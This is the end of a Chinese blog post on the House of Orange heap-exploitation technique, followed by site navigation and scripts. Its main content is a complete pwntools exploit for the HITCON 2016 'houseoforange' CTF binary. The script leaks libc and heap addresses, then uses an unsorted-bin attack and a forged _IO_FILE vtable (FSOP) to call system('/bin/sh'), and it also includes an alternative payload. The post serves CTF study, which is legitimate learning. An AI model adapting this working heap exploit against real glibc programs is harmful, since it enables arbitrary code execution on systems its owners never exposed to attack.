+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./libc.so.6_375198810bb39e6593a968fcbcf6556789026743'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice : '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Length of name :'</span>, str(length))</span><br><span class="line">    r.sendlineafter(<span class="string">'Name :'</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">'Price of Orange:'</span>, <span class="string">'100'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Color of Orange:'</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice : '</span>, <span class="string">'2'</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">'Price'</span>)</span><br><span class="line">    <span class="keyword">return</span> (tmp.split(<span class="string">'\n'</span>)[<span class="number">1</span>]).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice : '</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Length of name :'</span>, str(length))</span><br><span class="line">    r.sendlineafter(<span class="string">'Name:'</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">'Price of Orange: '</span>, <span class="string">'200'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Color of Orange: '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc:</span></span><br><span class="line">build(<span class="number">0x80</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x90</span></span><br><span class="line">payload += p32(<span class="number">0xdead</span>) + p32(<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xf31</span>)</span><br><span class="line"></span><br><span class="line">upgrade(len(payload)+<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x1000</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">build(<span class="number">0x400</span>, <span class="string">'ccccccc'</span>)</span><br><span class="line">leak = see()</span><br><span class="line">libc_base = u64(leak) - <span class="number">0x3c5188</span></span><br><span class="line">log.success(<span class="string">'libc_leak: '</span> + hex(u64(leak)))</span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line"><span class="comment">#leak heap:</span></span><br><span class="line">payload = <span class="string">'c'</span>*<span class="number">0xf</span></span><br><span class="line">upgrade(<span class="number">0x10</span>, payload)</span><br><span class="line">leak = see()</span><br><span class="line">heap_base = u64(leak) - <span class="number">0x130</span></span><br><span class="line">log.success(<span class="string">'heap_base: '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + <span class="number">0x3c5520</span></span><br><span class="line">system = libc_base + <span class="number">0x45390</span></span><br><span class="line">vtable = heap_base + <span class="number">0x5c0</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">#another bypass</span></span><br><span class="line"><span class="string">payload2 = '/bin/sh\x00' + p64(0x61)</span></span><br><span class="line"><span class="string">payload2 += p64(0xdeadbeef) + p64(io_list_all-0x10)</span></span><br><span class="line"><span class="string">payload2 = payload2.ljust(0xa0,'\x00')</span></span><br><span class="line"><span class="string">payload2 += p64(heap_base+0x700-0xd0)</span></span><br><span class="line"><span class="string">payload2 = payload2.ljust(0xc0,'\x00')</span></span><br><span class="line"><span class="string">payload2 += p64(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = 'd'*(0x400+0x20)</span></span><br><span class="line"><span class="string">payload += payload2</span></span><br><span class="line"><span class="string">payload += p64(0)*2</span></span><br><span class="line"><span class="string">payload += p64(vtable)#vtable = heap_base + 0x658</span></span><br><span class="line"><span class="string">payload += p64(1)</span></span><br><span class="line"><span class="string">payload += p64(2)</span></span><br><span class="line"><span class="string">payload += p64(3)</span></span><br><span class="line"><span class="string">payload += p64(0)*3</span></span><br><span class="line"><span class="string">payload += p64(system)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload = <span class="string">'d'</span>*(<span class="number">0x400</span>+<span class="number">0x20</span>)</span><br><span class="line">payload += <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) + p64(io_list_all<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">9</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line"></span><br><span class="line">upgrade(<span class="number">2048</span>,payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fsop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fsop-zh/</a></p>
+<p><a href="https://bbs.pediy.com/thread-251195-1.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251195-1.htm</a></p>
+<p><a href="https://www.lazenca.net/pages/viewpage.action?pageId=7536648" target="_blank" rel="noopener">https://www.lazenca.net/pages/viewpage.action?pageId=7536648</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/how2heap/" rel="tag"># how2heap</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/23/house-of-einherjar/" rel="next" title="house-of-einherjar">
+                <i class="fa fa-chevron-left"></i> house-of-einherjar
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/Sidebar_Avatar.jpg"
+                alt="Muirelle" />
+            
+              <p class="site-author-name" itemprop="name">Muirelle</p>
+              <p class="site-description motion-element" itemprop="description">吾将上下而求索</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://0x3f97.github.io/" title="16279" target="_blank">16279</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://firstkaixin.github.io/" title="Mrkaixin" target="_blank">Mrkaixin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cheemanl.github.io/" title="chessman" target="_blank">chessman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.kingkk.com/" title="Kingkk" target="_blank">Kingkk</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://snow146.github.io/" title="snow146" target="_blank">snow146</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#流程-part1：unsoretd-bin-attack"><span class="nav-number">1.</span> <span class="nav-text">流程 part1：unsoretd bin attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#流程-part2-IO-FILE-attack-FSOP"><span class="nav-number">2.</span> <span class="nav-text">流程 part2:_IO_FILE attack(FSOP)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-amp-理解："><span class="nav-number"></span> <span class="nav-text">分析&amp;理解：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#part1"><span class="nav-number">1.</span> <span class="nav-text">part1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#patr2"><span class="nav-number">2.</span> <span class="nav-text">patr2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hitcon-2016-houseoforange"><span class="nav-number"></span> <span class="nav-text">Hitcon 2016 houseoforange</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析函数"><span class="nav-number">1.</span> <span class="nav-text">分析函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程"><span class="nav-number">2.</span> <span class="nav-text">解题过程</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Muirelle</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("K1WEvzezolboN84rQYlF0Dvv-gzGzoHsz", "KnwfedBiA348tAxLpapkotlB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
